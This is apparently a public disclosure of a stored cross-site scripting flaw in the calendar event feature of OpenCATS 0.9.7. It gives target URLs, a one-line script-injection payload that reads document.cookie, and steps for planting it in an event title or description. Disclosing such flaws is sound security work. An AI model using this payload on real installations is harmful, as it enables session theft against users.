# Opencats-0.9.7-Stored XSS in Calendar-Add-Event
Date: 2022/12/25

Exploit Author: Sakura501

Vendor Homepage: https://www.opencats.org/

Software Link: https://github.com/opencats/OpenCATS

Version: 0.9.7

Tested on: Windows11/PHP7.3.4/MySQL5.7.26

## URL&POC
`http://192.168.2.153/src/opencats/index.php?m=calendar`

`http://192.168.2.153/src/opencats/index.php?m=calendar&view=DAYVIEW&month=12&year=2022&day=25&showEvent=1`

`<img src=x onerror=alert(document.cookie);>`

## Attack Steps
1. Click the Calendat Menu.
2. Add an event, and fill the XSS payload in Title or Desc.
![image](https://user-images.githubusercontent.com/71068573/209456687-a0f913ed-2716-48aa-89b1-2ec13a3f3e13.png)

3. Click the Add Event button, then the stored XSS will be triggered. You can also click the incoming event to trigger this stored XSS.
![image](https://user-images.githubusercontent.com/71068573/209456734-5181d116-bc9d-4693-8871-cf31b33b4534.png)

![image](https://user-images.githubusercontent.com/71068573/209456721-53cb3b93-11a0-4dda-a264-f5bfbc70e0ac.png)

## Source code analysis
![image](https://user-images.githubusercontent.com/71068573/209458256-b255cb58-e766-4d9c-84c1-1feeee8ce117.png)
